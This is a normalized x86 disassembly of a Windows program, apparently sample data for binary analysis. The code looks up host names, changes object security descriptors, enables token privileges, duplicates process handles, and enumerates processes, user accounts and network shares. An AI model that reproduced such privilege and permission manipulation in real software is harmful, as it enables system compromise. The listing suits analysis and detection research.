lea edx [ esp + 0xc ]
push 0xff
push edx
call gethostname
test eax eax
jne r-xdata
mov edi rw-data
lea eax [ esp + 0xc ]
push eax
call gethostbyname
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
mov edi eax
jmp r-xdata
and ecx 0x3
push rw-data
[ edi ] [ esi ]
call sub_403770
push rw-data
call sub_403770
add esp 0x8
pop edi
pop esi
add esp 0x104
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
sub_403910
sub esp 0x2c
mov ecx [ esp + 0x34 ]
lea edx [ esp ]
mov [ esp + 0xc ] ecx
push ebx
lea ecx [ esp + 0x38 ]
xor ebx ebx
mov [ esp + 0x2c ] edx
push ecx
lea edx [ esp + 0x14 ]
mov eax 0x1
push ebx
push edx
push eax
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] al
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] al
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] eax
mov [ esp + 0x48 ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
push esi
push ebx
push eax
push ebx
push ebx
push 0x4
push 0x6
push ecx
call SetSecurityInfo
mov edx [ esp + 0x3c ]
mov esi eax
push edx
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
pop esi
pop ebx
sete al
add esp 0x2c
retn
sub_4039c0
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
mov [ esp + 0x18 ] 0x2
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x10
retn
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x10
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
add esp 0x10
retn
sub_403a50
sub esp 0x220
push ebx
push ebp
mov ebp [ esp + 0x230 ]
push esi
mov esi [ esp + 0x230 ]
push edi
push esi
push 0x0
push ebp
call [ rw-data ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
push esi
push eax
push 0x40000
call [ rw-data ]
mov edi [ GetCurrentProcess@IAT ]
mov ebx [ DuplicateHandle@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
push eax
call sub_403910
add esp 0x8
lea edx [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push edx
call edi
push eax
mov eax [ esp + 0x24 ]
push eax
call edi
push eax
call ebx
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push 0x28
call edi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push edx
call sub_4039c0
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
mov ecx [ esp + 0x14 ]
push ecx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push esi
push 0x0
push 0x80000
call [ rw-data ]
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_403a30
add esp 0x8
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x34 ]
push 0x200
push ecx
push 0x1
push edx
mov [ esp + 0x30 ] 0x200
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x1
push 0x6
push esi
call SetSecurityInfo
test eax eax
jne r-xdata
push eax
push eax
lea ecx [ esp + 0x18 ]
push 0x40000
push ecx
call edi
push eax
push esi
call edi
push eax
call ebx
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
sub_403bd0
sub esp 0x104
push ebx
mov ebx [ esp + 0x10c ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
cmp [ ebx ] 0x0
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov edi [ _strnicmp@IAT ]
push ebp
not ecx
dec ecx
push rw-data
push ebx
mov esi ecx
call edi
add esp 0xc
test eax eax
jne r-xdata
push esi
push rw-data
push ebx
call edi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
lea edi [ esi + ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebx + ebp ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_403d00
sub esp 0x4c4
mov ecx [ esp + 0x4c8 ]
lea eax [ esp + 0x4 ]
push eax
push 0x20008
push ecx
mov [ esp + 0x14 ] 0x100
mov [ esp + 0xc ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0xe0 ]
push 0x3e8
push eax
push 0x1
push ecx
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
add esp 0x4c4
retn
lea edx [ esp + 0x10 ]
lea eax [ esp ]
push edx
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x4d4 ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xe8 ]
push edx
push eax
push ecx
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
add esp 0x4c4
retn
add esp 0x4c4
retn
sub_403da0
sub esp 0x944
mov eax [ rw-data ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax 0x2
push edi
mov [ esp + 0x14 ] ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
push ebp
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x10 ] ebx
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebp
mov [ esp + 0x14 ] edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
cmp eax ebp
pop ebp
pop ebx
je r-xdata
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x128
push eax
push ebx
call Process32First
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
mov ebx eax
push rw-data
push edi
mov [ esp + 0x24 ] ebx
call esi
cmp ebx ebp
mov [ esp + 0x18 ] eax
je r-xdata
add esp 0x944
retn
push eax
call [ FreeLibrary@IAT ]
cmp ebx 0xffffffff
je r-xdata
push rw-data
call sub_403770
mov ebp [ GetPriorityClass@IAT ]
add esp 0x4
cmp eax ebp
je r-xdata
push ebx
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x34 ]
push 0x410
push edx
call sub_403a50
add esp 0x8
mov ebx eax
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x20 ]
push eax
push 0x4
push ecx
push ebx
call [ esp + 0x2c ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x254 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x28 ] 0x100
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x458 ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x654 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x454 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x654 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x154 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
call [ GetUserNameA@IAT ]
lea edx [ esp + 0x154 ]
push edx
push ebx
call sub_403d00
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x254 ]
push 0x200
push edx
push eax
push ebx
call [ esp + 0x28 ]
lea ecx [ esp + 0x254 ]
push ecx
call sub_403bd0
add esp 0x4
lea ecx [ esp + 0x454 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x254 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebx
call [ CloseHandle@IAT ]
mov ebx [ esp + 0x10 ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x154 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x34 ]
lea edx [ esp + 0x154 ]
push ecx
push edx
lea ecx [ esp + 0x25c ]
push eax
lea edx [ esp + 0x460 ]
push ecx
push edx
lea eax [ esp + 0x768 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea ecx [ esp + 0x770 ]
push ecx
call sub_403770
add esp 0x20
lea edx [ esp + 0x2c ]
push edx
push ebx
call Process32Next
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x254 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x34 ]
push ecx
push 0x0
push 0x410
call [ rw-data ]
mov esi eax
push esi
call ebp
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x2
jne r-xdata
xor ebp ebp
sub_404110
sub esp 0x20
xor eax eax
mov ecx 0x2
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
lea eax [ esp ]
push eax
mov [ esp + 0x4 ] ecx
mov [ esp + 0xc ] 0x3
mov [ esp + 0x10 ] ecx
call sub_404150
add esp 0x24
retn
sub_404150
sub esp 0x5d4
push ebx
push rw-data
call sub_403770
mov ecx [ esp + 0x5e0 ]
add esp 0x4
lea eax [ esp + 0x10 ]
xor ebx ebx
push eax
push ecx
push ebx
push ebx
push 0x2
mov [ esp + 0x1c ] 0x4000
mov [ esp + 0x18 ] 0xffffffff
call [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
push ebp
push esi
push edi
push edx
push 0x40
call [ GlobalAlloc@IAT ]
mov ebp eax
mov [ esp + 0x20 ] ebp
xor eax eax
pop ebx
add esp 0x5d4
retn
push ebp
call [ GlobalFree@IAT ]
mov eax [ esp + 0x1c ]
push eax
call WNetCloseEnum
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
inc eax
pop ebx
add esp 0x5d4
retn
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] ebx
cmp eax ebx
jbe r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x14 ]
push ebp
push ecx
push edx
call [ rw-data ]
cmp eax ebx
jne r-xdata
add ebp 0x14
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
cmp edi ebx
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebx
mov ebx ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov ecx ebx
xor ebx ebx
and ecx 0x3
cmp eax ebx
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0x4 ]
cmp edi ebx
je r-xdata
or ecx 0xffffffff
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ edx ] 0x5c
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
or ecx 0xffffffff
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ edx + 0x2 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4e4 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x4e4 ]
push ecx
call gethostbyname
cmp eax ebx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0xe4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_403770
mov ecx [ ebp - 0x8 ]
add esp 0x4
and ecx 0x2
cmp cl 0x2
jne r-xdata
or ecx 0xffffffff
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov ecx [ eax ]
push ecx
call inet_ntoa
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x64 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
lea edi [ esp + 0x70 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xe4 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
inc eax
add ebp 0x20
cmp eax ecx
mov [ esp + 0x18 ] eax
jb r-xdata
lea edx [ ebp - 0x14 ]
push edx
call sub_404150
add esp 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x24 ] bl
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp edx ebx
[ edi ] [ esi ]
je r-xdata
mov ebp [ esp + 0x20 ]
jmp r-xdata
sub_4044e0
sub esp 0x120
mov dl [ rw-data ]
push ebx
push esi
push edi
mov ecx 0x7
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x2d ]
mov [ esp + 0x2c ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x6d ]
mov [ esp + 0x6c ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0xad ]
mov [ esp + 0xac ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0xed ]
mov [ esp + 0xec ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x6c ]
push eax
call sub_4049f0
mov ebx [ esp + 0x134 ]
add esp 0x4
mov eax [ ebx + 0x10 ]
sub eax 0x0
je r-xdata
lea edx [ esp + 0xc ]
mov edi rw-data
dec eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ ebx + 0x4 ]
and ecx 0x3
cmp eax 0x4
[ edi ] [ esi ]
jne r-xdata
dec eax
je r-xdata
or ecx 0xffffffff
lea edi [ esp + 0xc ]
xor eax eax
mov edx [ esp + 0x134 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x6c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0xac ]
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xec ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x120
retn
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
push ebp
mov ebp [ sprintf@IAT ]
cmp eax 0x5
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x120
retn
cmp eax 0xa
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
mov bl [ ebx + 0x15 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp bl 0x43
[ edi ] [ esi ]
je r-xdata
mov edx [ ebx + 0x8 ]
push edx
push eax
lea eax [ esp + 0x18 ]
push rw-data
push eax
call ebp
add esp 0x10
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x5a
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ ebx + 0x15 ]
and ecx 0x3
cmp al 0x41
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
jmp r-xdata
cmp bl 0x42
jne r-xdata
lea edx [ esp + 0x30 ]
mov edi rw-data
mov al [ ebx + 0x9a ]
cmp al 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea edx [ esp + 0xc ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
jmp r-xdata
and ecx 0x3
[ edi ] [ esi ]
cmp al 0x3
jne r-xdata
test [ ebx + 0x99 ] 0x2
lea edx [ esp + 0x30 ]
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp [ ebx ] 0x9c
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea edi [ ebx + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xb0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xf0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xc ]
and ecx 0xffff
push ecx
push rw-data
push edx
call ebp
add esp 0xc
pop ebp
jmp r-xdata
mov ax [ ebx + 0x98 ]
test al 0x80
je r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
push eax
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call ebp
add esp 0xc
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
test al 0x2
lea edx [ esp + 0x30 ]
je r-xdata
lea edx [ esp + 0x30 ]
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
sub_4049f0
sub esp 0x534
push ebx
push ebp
push esi
push edi
mov ebx 0x1
xor eax eax
mov ecx 0x2
mov ebp 0x3
mov edx 0x4
mov edi 0x5
mov esi 0x6
mov [ esp + 0x14 ] 0x36
mov [ esp + 0x16 ] bx
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] 0x1c
mov [ esp + 0x1e ] bx
mov [ esp + 0x20 ] rw-data
